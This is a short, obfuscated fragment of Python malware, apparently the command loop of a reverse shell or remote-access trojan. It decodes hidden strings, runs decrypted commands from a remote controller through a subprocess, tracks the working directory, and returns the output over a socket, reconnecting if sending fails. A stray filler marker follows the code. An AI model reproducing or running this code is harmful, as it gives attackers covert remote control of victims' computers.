		if decrypted != funrot('Nw0mEi81LHwVIgs'):
			l12cHnnd = funrot('NxIpHQ') + '%s&&%s&&%s' % (pwd, decrypted, pwdvar)
			stdout = fsubprocess(l12cHnnd)
			try:
				checkpath = stdout.split(fzo)[-2].strip(fzo).strip(eas)
				if os.path.exists(checkpath):
					pwd = checkpath
			except:
				pass
			result = fzo.join(stdout.split(fzo)[:-1])
			try:
				fremoteprint(result)
			except:
				fconnect()
s.close()
***JUNK2***